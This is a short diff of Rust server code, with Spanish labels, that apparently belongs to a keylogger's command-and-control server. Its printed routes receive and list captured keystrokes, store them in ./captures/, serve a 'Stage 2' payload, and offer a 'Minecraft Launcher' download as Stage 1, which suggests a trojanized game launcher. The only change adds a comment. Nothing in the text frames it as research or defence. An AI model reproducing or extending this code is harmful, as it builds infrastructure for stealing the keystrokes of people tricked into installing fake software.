@@ -23,7 +23,7 @@ async fn main() {
     println!("   POST /api/keys          - Recibir teclas");
     println!("   GET  /api/keys          - Ver todas las teclas");
     println!("   GET  /payload           - Descargar Stage 2");
-    println!("   GET  /download/stage1   - Descargar Minecraft Launcher (Stage 1)");
+    println!("   GET  /download/stage1   - Descargar Minecraft Launcher (Stage 1)");  // <--- NUEVO
     println!("📁 Las teclas se guardan en ./captures/");
 
     let listener = TcpListener::bind(addr).await.unwrap();
